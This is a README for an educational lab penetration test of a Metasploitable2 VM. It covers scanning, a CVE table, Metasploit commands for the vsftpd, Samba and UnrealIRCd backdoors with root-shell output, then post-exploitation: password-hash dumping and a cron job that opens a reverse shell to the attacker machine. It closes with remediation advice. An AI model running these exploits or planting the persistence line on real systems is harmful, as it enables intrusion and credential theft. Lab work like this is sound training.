# 🔐 Vulnerability Assessment & Exploitation in a Simulated Enterprise Network

![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-557C94?style=flat&logo=kalilinux&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework_6.x-2596be?style=flat)
![Nmap](https://img.shields.io/badge/Nmap-7.9x-blue?style=flat)
![VirtualBox](https://img.shields.io/badge/VirtualBox-7.x-183A61?style=flat&logo=virtualbox&logoColor=white)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=flat)
![Type](https://img.shields.io/badge/Type-Lab%20%2F%20Educational-orange?style=flat)

> ⚠️ **DISCLAIMER:** This project was conducted entirely in an isolated virtual lab environment for **educational purposes only**. All activities were performed on intentionally vulnerable systems owned and controlled by the author. **Never perform these techniques on systems you do not own or have explicit written authorization to test.**

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Lab Environment](#-lab-environment)
- [Tools Used](#-tools-used)
- [Methodology](#-methodology)
- [Reconnaissance](#-reconnaissance)
- [Vulnerabilities Identified](#-vulnerabilities-identified)
- [Exploitation](#-exploitation)
- [Post-Exploitation](#-post-exploitation)
- [Remediation](#-remediation)
- [Project Structure](#-project-structure)
- [References](#-references)

---

## 📌 Project Overview

This project simulates a real-world **black-box penetration test** against a vulnerable enterprise network. The goal was to identify, exploit, and document security vulnerabilities using industry-standard tools, following a structured penetration testing methodology.

**Key Objectives:**
- Set up an isolated virtual lab with attacker and victim machines
- Perform network reconnaissance and service enumeration
- Identify vulnerabilities using Searchsploit and Metasploit
- Exploit critical vulnerabilities to gain shell access
- Perform post-exploitation activities (enumeration, hashdump, persistence)
- Document all findings with remediation recommendations

---

## 🖥️ Lab Environment

### Network Topology

```
┌─────────────────────────────────────────────────┐
│           VirtualBox Host-Only Network           │
│                192.168.56.0/24                   │
│                                                  │
│  ┌─────────────┐         ┌─────────────────┐    │
│  │  Kali Linux │         │  Metasploitable2 │    │
│  │  (Attacker) │◄───────►│    (Victim)      │    │
│  │192.168.56.104         │ 192.168.56.103   │    │
│  └─────────────┘         └─────────────────┘    │
│                                                  │
│  Gateway: 192.168.56.1 (VirtualBox Host)         │
│  Unknown: 192.168.56.102 (Out of scope)          │
└─────────────────────────────────────────────────┘
```

### Virtual Machines

| Machine | OS | Role | IP Address | Adapter |
|---|---|---|---|---|
| Kali Linux | Kali 2024.x | Attacker | 192.168.56.104 | NAT + Host-Only |
| Metasploitable2 | Ubuntu 8.04 LTS | Victim / Target | 192.168.56.103 | Host-Only only |
| VirtualBox Host | Windows/Linux | Gateway | 192.168.56.1 | Host-Only gateway |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Kali Linux** | Attacker OS with pre-installed security toolkit |
| **Metasploit Framework** | Exploitation, payloads, post-exploitation modules |
| **Nmap** | Network discovery, port scanning, OS fingerprinting |
| **Searchsploit** | Offline Exploit-DB CVE lookup |
| **Netcat** | Reverse shells, port testing |
| **Wireshark** | Packet capture and traffic analysis |
| **VirtualBox** | Virtualization and isolated lab network |
| **Metasploitable2** | Intentionally vulnerable target VM |

---

## 🔍 Methodology

```
1. Environment Setup
       ↓
2. Reconnaissance (Nmap scanning)
       ↓
3. Vulnerability Identification (Searchsploit + msfconsole)
       ↓
4. Exploitation (Metasploit modules)
       ↓
5. Post-Exploitation (Enumeration, Hashdump, Persistence)
       ↓
6. Reporting (Findings + Remediation)
```

---

## 📡 Reconnaissance

### Host Discovery
```bash
nmap -sn 192.168.56.0/24
```

**Hosts Found:**

| IP | Status | Identified As |
|---|---|---|
| 192.168.56.1 | Live | VirtualBox Gateway — out of scope |
| 192.168.56.102 | Live | Unknown host — no services found, excluded |
| 192.168.56.103 | Live | ✅ Metasploitable2 — primary target |
| 192.168.56.104 | Live | Kali Linux — attacker machine |

### Full Port Scan
```bash
nmap -sV -sC -O -p- 192.168.56.103 -oN scan_results.txt
```

**Open Ports Discovered:**

| Port | Service | Version | Risk |
|---|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 | 🔴 CRITICAL |
| 22/tcp | SSH | OpenSSH 4.7p1 | 🟠 HIGH |
| 23/tcp | Telnet | Linux telnetd | 🔴 CRITICAL |
| 80/tcp | HTTP | Apache 2.2.8 | 🟠 HIGH |
| 139/445/tcp | SMB | Samba 3.0.20 | 🔴 CRITICAL |
| 3306/tcp | MySQL | MySQL 5.0.51a | 🟠 HIGH |
| 5432/tcp | PostgreSQL | PostgreSQL 8.3 | 🟡 MEDIUM |
| 5900/tcp | VNC | Protocol 3.3 | 🟠 HIGH |
| 6667/tcp | IRC | UnrealIRCd 3.2.8.1 | 🔴 CRITICAL |
| 8180/tcp | HTTP-Alt | Apache Tomcat 5.5 | 🟠 HIGH |

---

## 🚨 Vulnerabilities Identified

| # | Vulnerability | CVE | CVSS | Severity |
|---|---|---|---|---|
| 1 | vsftpd 2.3.4 Backdoor | CVE-2011-2523 | 10.0 | 🔴 CRITICAL |
| 2 | Samba usermap_script RCE | CVE-2007-2447 | 9.3 | 🔴 CRITICAL |
| 3 | UnrealIRCd Backdoor | CVE-2010-2075 | 9.8 | 🔴 CRITICAL |
| 4 | Telnet Cleartext Auth | CVE-1999-0619 | 7.5 | 🟠 HIGH |
| 5 | DVWA SQL Injection | CWE-89 | 8.8 | 🟠 HIGH |
| 6 | Apache Tomcat Weak Creds | CVE-2009-3843 | 7.5 | 🟠 HIGH |
| 7 | VNC No Authentication | CVE-2006-2369 | 7.5 | 🟠 HIGH |
| 8 | MySQL Anonymous Login | CVE-2012-2122 | 5.1 | 🟡 MEDIUM |

---

## 💥 Exploitation

### Exploit 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)

A backdoor was introduced into the vsftpd 2.3.4 source code. Sending a username ending with `:)` triggers a root shell on port 6200.

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit > set RHOSTS 192.168.56.103
msf6 exploit > run

# Result:
[*] Command shell session 1 opened (192.168.56.104 -> 192.168.56.103:6200)
# id
uid=0(root) gid=0(root)
```
✅ **Result: Unauthenticated root shell obtained**

---

### Exploit 2 — Samba usermap_script (CVE-2007-2447)

Samba 3.0.20 allows shell metacharacter injection via the username field, enabling unauthenticated RCE.

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit > set RHOSTS 192.168.56.103
msf6 exploit > set LHOST 192.168.56.104
msf6 exploit > set PAYLOAD cmd/unix/reverse
msf6 exploit > run

# Result:
[*] Command shell session 2 opened
uid=0(root) gid=0(root)
```
✅ **Result: Reverse root shell via SMB exploitation**

---

### Exploit 3 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)

A backdoor in the UnrealIRCd source code executes arbitrary commands when a string prefixed with `AB;` is sent to the IRC port.

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit > set RHOSTS 192.168.56.103
msf6 exploit > set LHOST 192.168.56.104
msf6 exploit > run

# Result:
[*] Command shell session 3 opened
uid=0(root) gid=0(root)
```
✅ **Result: Root shell via IRC backdoor**

---

## 🔎 Post-Exploitation

### System Enumeration
```bash
uname -a                        # Kernel & OS version
cat /etc/passwd                 # System users
id && whoami                    # Current privilege
ps aux                          # Running processes
netstat -antp                   # Active connections
find / -perm -4000 2>/dev/null  # SUID binaries
```

### Password Hash Extraction
```bash
meterpreter > hashdump

root:$1$Yr3VFqK5$yXqFp.ENKdsG3rwFRmDnH/:0:0:root:/root:/bin/bash
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:...
```

### Persistence (Demonstrated)
```bash
# Cron-based reverse shell
echo '*/5 * * * * root bash -i >& /dev/tcp/192.168.56.104/4444 0>&1' >> /etc/crontab
```

---

## 🛡️ Remediation

| Priority | Action |
|---|---|
| 🔴 CRITICAL | Upgrade vsftpd — remove version 2.3.4 immediately |
| 🔴 CRITICAL | Patch Samba CVE-2007-2447 — upgrade to Samba 4.x |
| 🔴 CRITICAL | Replace UnrealIRCd — disable IRC if not needed |
| 🔴 CRITICAL | Disable Telnet — use SSH with key-based auth only |
| 🟠 HIGH | Enable VNC authentication — restrict to trusted IPs |
| 🟠 HIGH | Change Apache Tomcat default credentials |
| 🟠 HIGH | Disable MySQL anonymous login |
| 🟢 GENERAL | Enable firewall, apply patches, deploy IDS/IPS, implement MFA |

---

## 📁 Project Structure

```
penetration-testing-lab/
│
├── README.md                        ← This file
├── docs/
│   └── pentest_clean_report.docx    ← Full detailed report
│
└── screenshots/
    ├── 01_nmap_host_discovery.png
    ├── 02_nmap_full_scan.png
    ├── 03_searchsploit_results.png
    ├── 04_vsftpd_root_shell.png
    ├── 05_samba_meterpreter.png
    ├── 06_unreal_ircd_shell.png
    ├── 07_system_enumeration.png
    └── 08_hashdump.png
```

---

## 📚 References

- [Metasploit Penetration Testing Lab (GitHub)](https://github.com/topics/metasploit)
- [Metasploitable2 Documentation](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [CVE-2011-2523 — vsftpd Backdoor](https://www.cve.org/CVERecord?id=CVE-2011-2523)
- [CVE-2007-2447 — Samba RCE](https://www.cve.org/CVERecord?id=CVE-2007-2447)
- [CVE-2010-2075 — UnrealIRCd Backdoor](https://www.cve.org/CVERecord?id=CVE-2010-2075)
- [Complete Metasploit Tutorial for Beginners (YouTube)](https://www.youtube.com/results?search_query=metasploit+tutorial+beginners)
- [Exploit-DB — Searchsploit](https://www.exploit-db.com/)

---

## 👤 Author

> This project was completed as part of a cybersecurity learning path covering penetration testing fundamentals, vulnerability assessment, and ethical hacking practices.

---

*⭐ If you found this helpful, feel free to star the repository!*
